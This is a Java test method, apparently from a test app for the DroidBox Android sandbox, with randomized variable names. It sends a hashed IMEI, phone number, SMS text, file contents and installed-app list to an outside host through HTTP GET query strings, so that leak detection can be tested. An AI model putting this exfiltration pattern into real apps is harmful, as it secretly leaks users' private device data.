class n5951610 {
	public void testNetworkHTTP() {
		Log.v("Test", "[*] testNetworkHTTP()");
		URL a1IDOrjh = null;
		HttpURLConnection KNiMXUe8 = null;
		try {
			a1IDOrjh = new URL("http://code.google.com/p/droidbox/");
			KNiMXUe8 = (HttpURLConnection) a1IDOrjh.openConnection();
			BufferedReader eNrwEL42 = new BufferedReader(new InputStreamReader(KNiMXUe8.getInputStream()));
			@SuppressWarnings("unused")
			String FKSXs1LX = "";
			while ((FKSXs1LX = eNrwEL42.readLine()) != null)
				;
			a1IDOrjh = new URL("http://pjlantz.com/imei.php?imei=" + hashedImei);
			KNiMXUe8 = (HttpURLConnection) a1IDOrjh.openConnection();
			eNrwEL42 = new BufferedReader(new InputStreamReader(KNiMXUe8.getInputStream()));
			while ((FKSXs1LX = eNrwEL42.readLine()) != null)
				;
			a1IDOrjh = new URL("http://pjlantz.com/phone.php?phone=" + phoneNbr);
			KNiMXUe8 = (HttpURLConnection) a1IDOrjh.openConnection();
			eNrwEL42 = new BufferedReader(new InputStreamReader(KNiMXUe8.getInputStream()));
			while ((FKSXs1LX = eNrwEL42.readLine()) != null)
				;
			a1IDOrjh = new URL("http://pjlantz.com/msg.php?msg=" + msg.replace(" ", "+"));
			KNiMXUe8 = (HttpURLConnection) a1IDOrjh.openConnection();
			eNrwEL42 = new BufferedReader(new InputStreamReader(KNiMXUe8.getInputStream()));
			a1IDOrjh = new URL("http://pjlantz.com/file.php?file=" + fileContent.replace(" ", "+"));
			KNiMXUe8 = (HttpURLConnection) a1IDOrjh.openConnection();
			eNrwEL42 = new BufferedReader(new InputStreamReader(KNiMXUe8.getInputStream()));
			while ((FKSXs1LX = eNrwEL42.readLine()) != null)
				;
			a1IDOrjh = new URL("http://pjlantz.com/app.php?installed=" + installedApps.replace(" ", "+"));
			KNiMXUe8 = (HttpURLConnection) a1IDOrjh.openConnection();
			eNrwEL42 = new BufferedReader(new InputStreamReader(KNiMXUe8.getInputStream()));
			while ((FKSXs1LX = eNrwEL42.readLine()) != null)
				;
		} catch (IOException cBRwXAZP) {
			cBRwXAZP.printStackTrace();
		} finally {
			KNiMXUe8.disconnect();
		}
	}

}